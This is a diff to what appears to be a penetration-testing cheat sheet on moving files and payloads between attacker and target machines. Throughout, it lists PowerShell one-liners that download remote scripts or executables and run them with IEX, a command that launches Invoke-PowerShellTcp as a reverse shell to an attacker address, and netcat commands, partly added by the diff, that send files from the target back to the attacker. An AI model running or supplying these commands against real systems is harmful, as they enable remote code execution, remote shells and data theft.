@@ -31,6 +31,10 @@ Python2
 ```
 Download
 > powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.1.1/Invoke-PowerShellTcp.ps1', 'C:\Invoke-PowerShellTcp.ps1')
+
+Download - newer variant:
+> IWE -uri http://192.168.1.1:80/file.exe -outfile file.exe
+
 Run
 > Invoke-PowerShellTcp.ps1 -Reverse -IPAddress 192.168.1.1 -Port 443
 
@@ -44,8 +48,9 @@ http://192.168.1.1/file.exe')
 > powershell.exe -c IEX (New-Object Net.WebClient).DownloadString('
 http://192.168.1.1/file.exe')
 
-or this one (newer):
+or newer variant:
 > powershell.exe -c 'IEX(IWR http://10.10.10.10/file.ps1 -UseBasicParsing)'
+
 
 base64 encoding to avoid badchars or to obfuscate:
 in linux:
@@ -76,5 +81,10 @@ On the target system:
 On the attacker system:
 > nc 192.168.1.1 80 < file.txt
 
-Also works the other way, to get files back to the attacker system
+Also works the other way, to get files back to the attacker system:
+On the attacker system:
+> nc -lvp 80 > file.txt
+On the target system:
+> cmd.exe /c ".\nc.exe -w 3 192.168.1.1 80 < file.txt"
+
 ```
